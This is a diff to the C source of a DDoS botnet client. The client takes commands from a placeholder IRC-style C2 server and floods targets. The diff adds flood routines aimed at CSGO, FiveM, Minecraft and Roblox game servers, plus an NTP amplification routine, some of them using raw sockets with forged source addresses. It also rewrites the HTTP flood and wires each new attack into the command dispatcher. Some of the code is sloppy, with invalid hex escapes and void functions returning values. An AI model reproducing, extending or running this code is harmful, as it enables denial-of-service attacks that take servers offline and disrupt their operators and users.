@@ -24,6 +24,7 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <pthread.h>
+#include <netinet/if_ether.h>
 ////////////////////////////////
 #define SERVER_LIST_SIZE (sizeof(SSPserver) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
@@ -35,8 +36,34 @@
 #define BUFSIZE 1000
 #define STD2_STRING "dts"
 #define STD2_SIZE 50
+#define std_packet 1460
+#define PACKET_SIZE 1024
+
+#define NTP_PACKET_SIZE 256
+#define NTP_TIMEOUT_SEC 10
+
+#define CSGO_IP_HDR_LEN 20
+#define CSGO_PKT_LEN 64
+#define CSGO_SRC_PORT 53485 // replace with desired source port
+#define CSGO_SRC_IP "10.0.6.58" // replace with desired source ip
 ////////////////////////////////
-unsigned char *SSPserver[] = {"IP HERE:6667"};
+// Minecraft packet structure
+struct MinecraftPacket {
+    // Packet length (including packet ID)
+    int length;
+    // Packet ID
+    char id;
+    // Packet data
+    char data[PACKET_SIZE-2];
+};
+
+struct RobloxPacket {
+    // Define the fields for your Roblox packet here
+    int packetLength;
+    char data[256];
+};
+////////////////////////////////
+unsigned char *SSPserver[] = {"SERVER IP HERE:6667"};
 ////////////////////////////////
 const char *useragents[] = {
 
@@ -388,7 +415,7 @@ const char *useragents[] = {
 
         "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
 };
-
+/////////////////////////////////////////
 const char *proxies[] = {
         '137.110.161.153:80', 
         '142.93.6.218:80', 
@@ -925,109 +952,200 @@ int socket_connect(char *host, in_port_t port) {
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////                                                                                                                           
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-void sendVSE(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
-{
-        char *vse_payload;
-        int vse_payload_len;
-	vse_payload = "TSource Engine Query", &vse_payload_len;
-        struct sockaddr_in dest_addr;
-        dest_addr.sin_family = AF_INET;
-        if(port == 0) dest_addr.sin_port = rand_cmwc();
-        else dest_addr.sin_port = htons(port);
-        if(getHost(target, &dest_addr.sin_addr)) return;
-        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-        register unsigned int pollRegister;
-        pollRegister = pollinterval;
-        if(spoofit == 32) 
-        {
-                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-                if(!sockfd) 
-                {
-                        return;
-                }
-                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
-                if(buf == NULL) return;
-                memset(buf, 0, packetsize + 1);
-                RandString(buf, packetsize);
-                int end = time(NULL) + timeEnd;
-                register unsigned int i = 0;
-                register unsigned int ii = 0;
-                while(1) 
-                {
-                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-                        if(i == pollRegister) {
-                        if(port == 0) dest_addr.sin_port = rand_cmwc();
-                        if(time(NULL) > end) break;
-                        i = 0;
-                        continue;
-                        }
-                        i++;
-                        if(ii == sleepcheck) {
-                        usleep(sleeptime*1000);
-                        ii = 0;
-                        continue;
-                        }
-                        ii++;
-                }
-        } 
-        else 
-        {
-                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-                if(!sockfd) 
-                {
-                        return;
-                }
-                int tmp = 1;
-                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
-                return;
-                }
-                int counter = 50;
-                while(counter--) 
-                {
-                        srand(time(NULL) ^ rand_cmwc());
-                        init_rand(rand());
-                }
-                in_addr_t netmask;
-                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
-                else netmask = ( ~((1 << (32 - spoofit)) - 1) );
-                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
-                struct iphdr *iph = (struct iphdr *)packet;
-                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
-                makeVSEPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
-                udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
-                udph->source = rand_cmwc();
-                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-                udph->check = 0;
-                udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
-                RandString((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
-                iph->check = csum ((unsigned short *) packet, iph->tot_len);
-                int end = time(NULL) + timeEnd;
-                register unsigned int i = 0;
-                register unsigned int ii = 0;
-                while(1) {
-                        sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-                        udph->source = rand_cmwc();
-                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-                        iph->id = rand_cmwc();
-                        iph->saddr = htonl( GetRandomIP(netmask) );
-                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
-                        if(i == pollRegister) 
-                        {
-                                if(time(NULL) > end) break;
-                                i = 0;
-                                continue;
-                        }
-                        i++;
+void sendCSGO(const char* dst_ip, int port, int duration) {
+    // initialize packet buffer
+    char pkt[CSGO_PKT_LEN];
+    memset(pkt, 0, CSGO_PKT_LEN);
 
-                        if(ii == sleepcheck) 
-                        {
-                                usleep(sleeptime*1000);
-                                ii = 0;
-                                continue;
-                        }
-                        ii++;
-                }
+    // set IP header fields
+    struct iphdr *ip_hdr = (struct iphdr *) pkt;
+    ip_hdr->ihl = 5;
+    ip_hdr->version = 4;
+    ip_hdr->tos = 0;
+    ip_hdr->tot_len = htons(CSGO_PKT_LEN);
+    ip_hdr->id = htons(54321);
+    ip_hdr->frag_off = htons(16384);
+    ip_hdr->ttl = 64;
+    ip_hdr->protocol = IPPROTO_UDP;
+    ip_hdr->check = 0;
+    ip_hdr->saddr = inet_addr(CSGO_SRC_IP);
+    ip_hdr->daddr = inet_addr(dst_ip);
+
+    // set UDP header fields
+    struct udphdr *udp_hdr = (struct udphdr *) (pkt + CSGO_IP_HDR_LEN);
+    udp_hdr->source = htons(CSGO_SRC_PORT);
+    udp_hdr->dest = htons(port);
+    udp_hdr->len = htons(CSGO_PKT_LEN - CSGO_IP_HDR_LEN);
+    udp_hdr->check = 0;
+
+    // send packet to server for the specified duration
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(dst_ip);
+
+    time_t start_time = time(NULL);
+    while ((time(NULL) - start_time) < duration) {
+        sendto(sock, pkt, CSGO_PKT_LEN, 0, (struct sockaddr *) &sin, sizeof(sin));
+    }
+}
+
+void sendFiveM(unsigned char *target, int port, int secs) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char buffer[1024] = "GET / HTTP/1.1\r\n";
+
+    // create a socket
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket error");
+        exit(EXIT_FAILURE);
+    }
+
+    // set up the server address structure
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+    server_addr.sin_addr.s_addr = inet_addr(target);
+
+    // connect to the server
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect error");
+        exit(EXIT_FAILURE);
+    }
+
+    time_t start_time = time(NULL);
+
+    // send the attack packet repeatedly
+    while (time(NULL) - start_time < secs) {
+        if (send(sockfd, buffer, strlen(buffer), 0) < 0) {
+            perror("send error");
+            exit(EXIT_FAILURE);
         }
+    }
+
+    close(sockfd);
+}
+
+void sendMinecraft(unsigned char *target, int port, int secs) {
+    // Convert IP address string to binary format
+    struct in_addr addr;
+    if (inet_pton(AF_INET, target, &addr) != 1) {
+        perror("inet_pton");
+        exit(1);
+    }
+
+    // Create a socket
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        perror("socket");
+        exit(1);
+    }
+
+    // Set socket to non-blocking mode
+    if (fcntl(sockfd, F_SETFL, O_NONBLOCK) == -1) {
+        perror("fcntl");
+        exit(1);
+    }
+
+    // Connect to the server
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr = addr;
+    server_addr.sin_port = htons(port);
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1 && errno != EINPROGRESS) {
+        perror("connect");
+        exit(1);
+    }
+
+    // Get the current time
+    time_t start_time = time(NULL);
+
+    // Send packets until the specified duration has passed
+    while (time(NULL) - start_time < secs) {
+        // Construct the Minecraft packet
+        struct MinecraftPacket packet;
+        packet.id = 0x00;
+        // Fill in the packet data with your desired payload
+        packet.length = snprintf(packet.data, PACKET_SIZE-2, "Hello, server!");
+
+        // Send the packet to the server
+        int bytes_sent = send(sockfd, &packet, packet.length+2, MSG_DONTWAIT);
+        if (bytes_sent == -1) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                // Socket is not ready for sending, try again later
+                continue;
+            } else {
+                // Error occurred while sending, exit
+                perror("send");
+                exit(1);
+            }
+        }
+    }
+
+    // Close the socket
+    close(sockfd);
+}
+
+void sendROBLOX(unsigned char *target, int port, int secs) {
+    // Convert IP address string to binary format
+    struct in_addr addr;
+    if (inet_pton(AF_INET, target, &addr) != 1) {
+        perror("inet_pton");
+        exit(1);
+    }
+
+    // Create a socket
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        perror("socket");
+        exit(1);
+    }
+
+    // Set the socket to non-blocking mode
+    int flags = fcntl(sockfd, F_GETFL, 0);
+    if (flags == -1) {
+        perror("fcntl");
+        exit(1);
+    }
+    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
+        perror("fcntl");
+        exit(1);
+    }
+
+    // Connect to the server
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr = addr;
+    server_addr.sin_port = htons(port);
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1 && errno != EINPROGRESS) {
+        perror("connect");
+        exit(1);
+    }
+
+    // Get the current time
+    time_t start_time = time(NULL);
+
+    // Send packets until the specified duration has passed
+    while (time(NULL) - start_time < secs) {
+        // Construct the Roblox packet
+        struct RobloxPacket packet;
+        packet.packetLength = sizeof(packet.data);
+        // Fill in the packet data with your desired payload
+
+        // Send the packet to the server
+        ssize_t bytes_sent = send(sockfd, &packet, sizeof(packet), 0);
+        if (bytes_sent == -1 && errno != EAGAIN) {
+            perror("send");
+            exit(1);
+        } else if (bytes_sent > 0) {
+            printf("Sent packet of size %ld\n", bytes_sent);
+        }
+    }
+
+    // Close the socket
+    close(sockfd);
 }
 
 ////////////////////////////////////////////////////////////////////
@@ -1056,11 +1174,12 @@ void sendZAP(unsigned char *ip, int port, int secs)
     sin.sin_family = hp->h_addrtype;
     sin.sin_port = port;
     unsigned int a = 0;
+
     while(1)
     {
         char *rhexstring[] = {
-        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
-        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
+                "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
+                "\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
         };
         if (a >= 50)
         {
@@ -1080,21 +1199,29 @@ void sendZAP(unsigned char *ip, int port, int secs)
 void sendOVH(unsigned char *ip, int port, int secs)
     {
     int std_hex;
+
     std_hex = socket(AF_INET, SOCK_DGRAM, 0);
+
     time_t start = time(NULL);
+
     struct sockaddr_in sin;
+
     struct hostent *hp;
+
     hp = gethostbyname(ip);
+
     bzero((char*) &sin,sizeof(sin));
     bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
     sin.sin_family = hp->h_addrtype;
     sin.sin_port = port;
+
     unsigned int a = 0;
+
     while(1)
     {
         char *rhexstring[] = {
-        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
-        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
+                "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
+                "\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
         };
         if (a >= 50)
         {
@@ -1180,49 +1307,40 @@ void sendOVHL7(char *host, in_port_t port, int timeEnd, int power) {
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 
-void sendHTTP(unsigned char *ip, int port, int secs) {
-	int i, sock;
-	time_t start = time(NULL);
-	
-	char buffer[1];
+void sendHTTP(char *host, in_port_t port, int timeEnd) {
 
-    char request[512];
-    const char *methods[] = {
-        "GET",
-        "HEAD",
-        "POST"
-    };
-    const char *connections[] = {
-        "close",
-        "keep-alive",
-        "accept"
-    };
-	
-	int power = getdtablesize() / 2;
-	for(i = 0; i < power; i++) {
-		if(fork() == 0) {
-			while(1) {
-                sock = socket_connect(ip, port);
-				if(sock != 0) {
-                    strcpy(request, "");
-                    strcpy(request + strlen(request), methods[rand() % (sizeof(methods) / sizeof(methods[0]))]);
-                    strcpy(request + strlen(request), " / HTTP/1.1\r\nHost: ");
-                    strcpy(request + strlen(request), ip);
-                    strcpy(request + strlen(request), "\r\nUser-Agent: ");
-                    strcpy(request + strlen(request), useragents[rand() % (sizeof(useragents) / sizeof(useragents[0]))]);
-                    strcpy(request + strlen(request), "\r\nConnection: ");
-                    strcpy(request + strlen(request), connections[rand() % (sizeof(connections) / sizeof(connections[0]))]);
-                    strcpy(request + strlen(request), "\r\n\r\n");
-                    write(sock, request, strlen(request));
-                    read(sock, buffer, 1);
-                    close(sock);
+	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
+
+	char request[512], buffer[1];
+
+	for (i = 0; i < 1000; i++) {
+
+		sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", host, useragents[(rand() % 36)]);
+
+		if (fork()) {
+
+			while (end > time(NULL)) {
+
+				socket = socket_connect(host, port);
+
+				if (socket != 0) {
+
+					write(socket, request, strlen(request));
+
+					read(socket, buffer, 1);
+
+					close(socket);
+
 				}
-				if(time(NULL) >= start + secs){
-					_exit(0);
-				}
+
 			}
+
+			exit(0);
+
 		}
+
 	}
+
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -1237,6 +1355,61 @@ void sendHTTP(unsigned char *ip, int port, int secs) {
 // |__/  |__/ \______/ |__/     |__/|________/      |__/     |__/|________/   |__/   |__/  |__/ \______/ |_______/  \______/  //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+void sendNTPAMP(unsigned char *ip, int port, int secs) 
+{
+    int sockfd;
+    char buffer[NTP_PACKET_SIZE];
+    struct sockaddr_in server_addr;
+
+    // create socket
+    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sockfd < 0) 
+    {
+        perror("socket creation failed");
+        return 1;
+    }
+
+    // set server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) 
+    {
+        perror("invalid server address");
+        return 1;
+    }
+
+    // set timeout
+    struct timeval timeout;
+    timeout.tv_sec = NTP_TIMEOUT_SEC;
+    timeout.tv_usec = 0;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) 
+    {
+        perror("setsockopt failed");
+        return;
+    }
+
+    // initialize packet buffer
+    memset(buffer, 0, NTP_PACKET_SIZE);
+    buffer[0] = 0x1b;
+
+    // send packets for given duration
+    time_t start_time = time(NULL);
+    while (time(NULL) < start_time + secs) 
+    {
+        if (sendto(sockfd, buffer, NTP_PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) 
+        {
+            perror("sendto failed");
+            return;
+        }
+    }
+
+    // close socket
+    close(sockfd);
+
+    return;
+}
 
 void sendSTD(unsigned char *ip, int port, int secs) {
 
@@ -1273,8 +1446,6 @@ void sendSTD(unsigned char *ip, int port, int secs) {
         }
         a++;
     }
-	
-
 }
 
 void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
@@ -1517,68 +1688,6 @@ void sendHEX(unsigned char *ip, int port, int secs, int packetsize)
         }
 }
 
-void sendLDAP(unsigned char *ip, int port, int secs) 
-{
-        int iSTD_Sock;
-        iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
-        time_t start = time(NULL);
-        struct sockaddr_in sin;
-        struct hostent *hp;
-        hp = gethostbyname(ip);
-        bzero((char*) &sin,sizeof(sin));
-        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
-        sin.sin_family = hp->h_addrtype;
-        sin.sin_port = port;
-        unsigned int a = 0;
-        while(1){
-                char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
-                char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
-                if (a >= 50)
-                {
-                        send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
-                        connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
-                        if (time(NULL) >= start + secs)
-                        {
-                                close(iSTD_Sock);
-                                _exit(0);
-                        }                            
-                        a = 0;
-                }
-                a++;
-        }
-}
-
-void sendNTP(unsigned char *ip, int port, int secs) 
-{
-        int iSTD_Sock;
-        iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
-        time_t start = time(NULL);
-        struct sockaddr_in sin;
-        struct hostent *hp;
-        hp = gethostbyname(ip);
-        bzero((char*) &sin,sizeof(sin));
-        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
-        sin.sin_family = hp->h_addrtype;
-        sin.sin_port = port;
-        unsigned int a = 0;
-        while(1){
-                char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
-                char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
-                if (a >= 50)
-                {
-                        send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
-                        connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
-                        if (time(NULL) >= start + secs)
-                        {
-                                close(iSTD_Sock);
-                                _exit(0);
-                        }                             
-                        a = 0;
-                }
-                a++;
-        }
-}
-
 char *defarchs() {
     #if defined(__x86_64__) || defined(__amd64__) || defined(__amd64) || defined(__x86_64) || defined(_M_X64) || defined(_M_AMD64)
     return "x86_64";
@@ -1666,9 +1775,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "UDP"))
         {
-                if(argc < 6 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1 || atoi(argv[4]) > 32 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500);
-                return;
-
                 unsigned char * ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1698,19 +1804,11 @@ void cncinput(int argc, unsigned char * argv[])
                 return;
         }
 
-        if(!strcmp(argv[0], "VSE"))
+        if(!strcmp(argv[0], "NTP-AMP"))
         {
-                if(argc < 8 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1 || atoi(argv[4]) > 32 || atoi(argv[5]) == -1 || atoi(argv[6]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
-                int spoofit = atoi(argv[4]);
-                int packetsize = atoi(argv[5]);
-                int pollinterval = atoi(argv[6]);
-                int sleepcheck = atoi(argv[7]);
-                int sleeptime = atoi(argv[8]);
 
                 if (strstr(ip, ",") != NULL) 
                 {
@@ -1718,7 +1816,7 @@ void cncinput(int argc, unsigned char * argv[])
                         while (hi != NULL) 
                         {
                                 if (!listFork()) {
-                                sendVSE(hi, port, time, spoofit, packetsize, pollinterval, sleepcheck, sleeptime);
+                                sendNTPAMP(hi, port, time);
                                 _exit(0);
                                 }
                                 hi = strtok(NULL, ",");
@@ -1728,7 +1826,65 @@ void cncinput(int argc, unsigned char * argv[])
                 {
                         if (!listFork()) 
                         {
-                                sendVSE(ip, port, time, spoofit, packetsize, pollinterval, sleepcheck, sleeptime);
+                                sendNTPAMP(ip, port, time);
+                                _exit(0);
+                        }
+                }
+                return;
+        }
+
+        if(!strcmp(argv[0], "MINECRAFT"))
+        {
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+
+                if (strstr(ip, ",") != NULL) 
+                {
+                        unsigned char * hi = strtok(ip, ",");
+                        while (hi != NULL) 
+                        {
+                                if (!listFork()) {
+                                sendMinecraft(hi, port, time);
+                                _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } 
+                else 
+                {
+                        if (!listFork()) 
+                        {
+                                sendMinecraft(ip, port, time);
+                                _exit(0);
+                        }
+                }
+                return;
+        }
+
+        if(!strcmp(argv[0], "FIVEM"))
+        {
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+
+                if (strstr(ip, ",") != NULL) 
+                {
+                        unsigned char * hi = strtok(ip, ",");
+                        while (hi != NULL) 
+                        {
+                                if (!listFork()) {
+                                sendFiveM(hi, port, time);
+                                _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } 
+                else 
+                {
+                        if (!listFork()) 
+                        {
+                                sendFiveM(ip, port, time);
                                 _exit(0);
                         }
                 }
@@ -1737,9 +1893,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "OVH-GAME"))
         {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1769,9 +1922,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "TCP"))
         {
-                if(argc < 6 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1 || atoi(argv[4]) > 32 || atoi(argv[6]) == -1 || atoi(argv[6]) > 65500);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1806,9 +1956,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "STD"))
         {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1835,12 +1982,67 @@ void cncinput(int argc, unsigned char * argv[])
                 }
                 return;
         }
+
+        if(!strcmp(argv[0], "CSGO"))
+        {
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+
+                if (strstr(ip, ",") != NULL) 
+                {
+                        unsigned char * hi = strtok(ip, ",");
+                        while (hi != NULL) 
+                        {
+                                if (!listFork()) {
+                                sendCSGO(hi, port, time);
+                                _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } 
+                else 
+                {
+                        if (!listFork()) 
+                        {
+                                sendCSGO(ip, port, time);
+                                _exit(0);
+                        }
+                }
+                return;
+        }
+
+        if(!strcmp(argv[0], "ROBLOX"))
+        {
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+
+                if (strstr(ip, ",") != NULL) 
+                {
+                        unsigned char * hi = strtok(ip, ",");
+                        while (hi != NULL) 
+                        {
+                                if (!listFork()) {
+                                sendROBLOX(hi, port, time);
+                                _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } 
+                else 
+                {
+                        if (!listFork()) 
+                        {
+                                sendROBLOX(ip, port, time);
+                                _exit(0);
+                        }
+                }
+                return;
+        }
         
         if(!strcmp(argv[0], "ZAP"))
         {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1870,9 +2072,6 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "HTTP"))
         {
-                if(argc < 3 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
@@ -1902,13 +2101,9 @@ void cncinput(int argc, unsigned char * argv[])
 
         if(!strcmp(argv[0], "OVH-HTTP"))
         {
-                if(argc < 4 || atoi(argv[2]) == -1 || atoi(argv[2]) > 65500 || atoi(argv[3]) == -1);
-                return;
-
                 unsigned char *ip = argv[1];
                 int port = atoi(argv[2]);
                 int time = atoi(argv[3]);
-                int power = atoi(argv[4]);
 
                 if (strstr(ip, ",") != NULL) 
                 {
@@ -1916,7 +2111,7 @@ void cncinput(int argc, unsigned char * argv[])
                         while (hi != NULL) 
                         {
                                 if (!listFork()) {
-                                sendOVHL7(hi, port, time, power);
+                                sendOVHL7(hi, port, time, 250);
